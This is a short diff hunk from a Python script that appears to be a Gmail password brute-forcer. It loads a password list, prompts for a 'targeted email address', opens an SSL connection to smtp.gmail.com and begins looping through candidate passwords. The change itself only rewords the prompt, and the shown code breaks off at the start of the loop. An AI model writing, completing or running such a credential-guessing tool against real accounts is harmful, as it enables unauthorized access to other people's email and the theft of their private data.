@@ -24,7 +24,7 @@ pass_lst = passwfile.readlines()
 
 def login():
     i = 0
-    usr = raw_input('What is the targets email address :')
+    usr = raw_input('What is the targeted email address :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
     for passw in pass_lst:
